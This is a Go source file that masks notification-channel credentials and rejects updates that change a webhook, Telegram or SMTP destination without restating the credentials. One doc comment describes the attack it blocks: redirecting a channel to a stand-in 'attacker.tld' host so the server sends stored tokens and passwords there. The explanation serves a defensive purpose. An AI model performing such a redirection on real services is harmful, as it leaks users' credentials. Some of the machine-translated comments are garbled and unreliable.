package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// The API returns the credentials with a value with this prefix, replacing the actual content.
//
// The use of a prefix instead of an empty string or some fixed constant is to allow for some
// identifiable information (see MaskedValue) alongside the prefix, so that the user can tell "which
// bot this is" without having to re-paste the key.
const MaskedPrefix = "__masked__"

// MaskedValue generates a masked value:
//
//	"__masked__" is too short to give any hint. "__masked__:...ab12cd" has the last 6 digits of the
//	original value as a hint.
//
// Only the last 6 bits are deliberately exposed: the webhook address identifier is at the end
// (e.g., WeCom's key, Feishu's bot id), and the prefix part is the same for all bots, with no
// identifier value.
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is masked (i.e., has not been modified since the interface
// returned it).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of the configuration, replacing the credentials field for that channel
// with a mask value.
//
// Unknown channel types return an empty map instead of the original configuration - it is
// preferable to have the UI display "configuration unavailable" rather than throw back the entire
// original content that may contain credentials when the channel type cannot be recognized.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// Headers This type of nested structure is treated as a single credential: determining each
		// subkey requires each channel to declare a set of rules "which subkeys are credentials",
		// which is far more complex than it is useful.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials means "The destination address has changed, but the
// caller did not state against the credentials field." Return it instead of silently releasing or
// silently discarding the credentials, for reasons seen in PrepareConfigUpdate.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // Destination key changed
	Missing []string // Credentials for non-explicit states
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "目标地址（" + strings.Join(e.Changed, "、") + "）已变更，请同时重新填写凭据字段（" +
		strings.Join(e.Missing, "、") + "）：填入新值，或显式留空表示不再需要凭据。" +
		"原凭据只对旧地址有效，继续沿用等于把它交给新地址。"
}

// PrepareConfigUpdate consolidates channel configuration and handles the security-sensitive "target
// address change".
//
// It replaces the naked MergeConfig on the channel update path, and solves the problem with a
// practical path: The target address (where the message is sent to) and the credentials (who sends
// it) are two separate sets of fields, and MergeConfig keeps the original values in the library for
// "unmentioned keys". So anyone who can PATCH a channel can just** change the address, avoiding the
// credentials**, and have the server send the real credentials from the library to the endpoints
// they control:
//
//	webhook {config:{url:"https://attacker.tld"}} → send the original Authorization header with the
//	request telegram {config:{base_url:"https://attacker.tld"}} → /bot<trueToken>/sendMessage email
//	{config:{host:"smtp.attacker.tld"}} → STARTTLS after submitting the username and password
//
// This path is completely silent, does not rely on redirects (so refusing to jump between hosts
// can't stop it), and hits directly through the target of the packet masking mechanism—"no
// credentials returned to the browser."
//
// Rule: Whenever a destination key is changed to a new value, the caller must explicitly state for
// each ** credential key:
// - Give new value → Use new value
// - explicit space string → the field no longer requires credentials (keeping the semantics empty)
// - Return the mask value as it is / simply ignore this key → Reject
//
// The third is also rejected because the mask value means "remember old credentials", and old
// credentials are only valid for old addresses. This is deliberately not done to "discard
// credentials" - it would silently change optional credential fields (headers for webhooks,
// passwords for emails) to "authorization expired but interface returned 200", which is more
// difficult to sort out than reporting an error.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("渠道类型 %q 未注册", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// If a non-string attribute (such as the headers of a webhook is an object) has a masked word
	// size, it indicates that the caller has inserted a "keep-as-is" sentinel into the structure.
	// MergeConfig only recognizes "strings with prefixes" as masks, and this form will be saved as
	// a regular object — Curry actually drops the word size "__masked__", and subsequent
	// authorizations fail silently without any errors.
	//
	// This check must be put at the front of the **: if the address is unchanged, it will go back
	// ahead, and if it is put at the back, it will cover only the path "change address" (this was
	// the first version that was wrongly placed, and the test caught it straight away).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find the target key that was actually changed. The mask value is "unchanged".
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// The address remains unchanged, and the normal merger is performed (mask values are
		// retained, empty strings are cleared, and the rest is covered).
		return MergeConfig(stored, incoming), nil
	}

	// Address changed: Requires explicit state for each credential key.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers Rejects the submission of masked sentinels embedded in non-string
// structures.
//
// The masking mechanism assumes that the whole value is a string. Object fields such as headers in
// webhooks can only be committed as a full mask (written as the string "__masked__") or as a whole;
// inserting a sentinel inside an object does not express "permanence" and will be stored as the
// true value.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("字段 %s 的内容里含掩码标记 %q：该字段只能整体留空表示沿用、或整体提交新值，不能在结构体内部夹带掩码占位",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compares whether two configuration values are equivalent. The JSON serialization
// comparison is used to side-track type differences — the front-end submits port number, while the
// Curry reads back float64, so direct == would be misjudged.
//
// The empty string must be normalized before comparison: an empty string is the same as a "key does
// not exist" in this configuration model, because MergeConfig clearly empties the empty string and
// deletes the key directly.
//
//	The first time the database is created, save base_url: "" → the first time the database is
//	saved, MergeConfig deletes the key → the second time the database is saved, incoming is "",
//	stored is missing, and the address has changed → the credentials are masked → 400 "The target
//	address has changed, please fill in the credentials field again at the same time."
//
// Every save after that failed, unless the user re-pasted the Bot Token and he didn't change
// anything.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue determines whether a configuration value is "empty". The gauge must match the
// MergeConfig blank determination (strings.TrimSpace(s) == ""), otherwise there will be a gap where
// "MergeConfig thinks that the deletion is valid, sameConfigValue thinks it is".
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming to stored, used to update channel configuration.
//
// Rules:
// - incoming : the value of the masked key → keeps the original value of stored (the user has not
// changed this field)
// - incoming key with an empty string → treats the key as explicitly empty and deletes it
// - Rest of the key → Override with incoming
// - keys in stored but not in incoming → keep (locally update semantics)
//
// Whether an empty string is considered "empty" needs to be clarified: the front-end forms submit
// unfilled fields as empty strings, and if they are entered as valid values, the "leave empty to
// retain original value" field will be cleared. The explicit blanking option is chosen here because
// the user has no other way of expressing when clearing a misconfigured field (the drag-and-drop
// field distinguishes between "not provided" and "provided empty", but the UI does not use this
// distinction).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // Mask value = unmodified, retained stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
